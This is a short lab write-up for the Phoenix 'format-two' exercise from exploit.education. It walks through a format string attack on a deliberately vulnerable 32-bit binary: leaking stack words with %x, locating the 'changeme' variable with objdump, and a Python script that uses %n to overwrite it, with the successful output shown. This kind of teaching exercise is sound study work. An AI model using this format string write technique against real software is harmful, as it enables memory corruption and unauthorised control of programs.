<h3 style="text-align:center" dir="rtl">بسم الله الرحمن الرحيم </h3>

# Format Two:
From the begining of those levels I was using the amd64 levels but in this level because of a bad character in the address of `changeme` variable I could not solve it so in this level I will use the 32-bit program.
<br/>

```c
 if (argc > 1) {
    memset(buf, 0, sizeof(buf));
    strncpy(buf, argv[1], sizeof(buf));
    bounce(buf);
  }
```
The program takes an argument and copy it to `buffer`.The `buffer` is passed to `bounce` function which will print the content of the variable.We need to pass format parameters to buffer and find the offset from the stack frame of `printf` to the start of `buffer` variable.
```bash
root@phoenix-amd64:/opt/phoenix/i486# ./format-two AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x 

Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAA.ffffd7e9.100.0.f7f84b67.ffffd620.ffffd608.80485a0.ffffd500.ffffd7e9.100.0.41414141.2e78252e.252e7825.78252e78.2e78252eBetter luck next time!

```
The begining of `buffer` is after 11 address since we controll the buffer we can insert the address of `changeme` variable and with the help of `%n` format parameter we can overwrite the value of `changeme` variable.Let find the address of `changeme`.

```bash
root@phoenix-amd64:/opt/phoenix/i486# objdump -x  format-two | grep changeme
08049868 g     O .bss	00000004 changeme
```
The address of the variable `changeme` is `08049868`.Now we can overwrite the value of `changeme` using `%n`.

```python
import struct
import os
string= ''
string += struct.pack('I', 0x8049868)
string += '%x.' * 11
string += '%n'
os.system(" ./format-two " + string)
```


## Exploit:
```bash
root@phoenix-amd64:/opt/phoenix/i486# python exploit.py 
Welcome to phoenix/format-two, brought to you by https://exploit.education
hffffd7f3.100.0.f7f84b67.ffffd630.ffffd618.80485a0.ffffd510.ffffd7f3.100.0.Well done, the 'changeme' variable has been changed correctly!
```
